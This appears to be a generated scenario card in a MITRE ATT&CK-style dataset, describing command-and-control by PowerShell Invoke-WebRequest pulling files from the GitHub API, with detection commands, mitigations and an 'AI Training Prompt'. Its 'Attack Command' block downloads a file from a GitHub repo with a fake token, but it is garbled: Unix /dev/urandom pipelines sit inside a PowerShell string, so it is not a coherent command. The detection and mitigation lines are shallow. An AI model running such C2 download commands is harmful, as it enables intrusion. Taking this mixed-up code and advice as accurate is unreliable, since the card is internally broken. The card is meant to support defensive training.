---
type: campaign
scenario_id: 393
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via GitHub API.

## Threat Description
Using Invoke-WebRequest for C2 via GitHub API.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://api.github.com/repos/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/contents/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -Headers @{Authorization='token $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 40)'} -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest GitHub: `wmic process where name='powershell.exe' get commandline | findstr api.github.com`; Network traffic: `tshark -Y 'http.host contains api.github.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block GitHub API: `netsh advfirewall firewall add rule name='Block GitHub' dir=out action=block remoteip=140.82.112.0/20`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via GitHub API by analyzing HTTP headers, GitHub API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
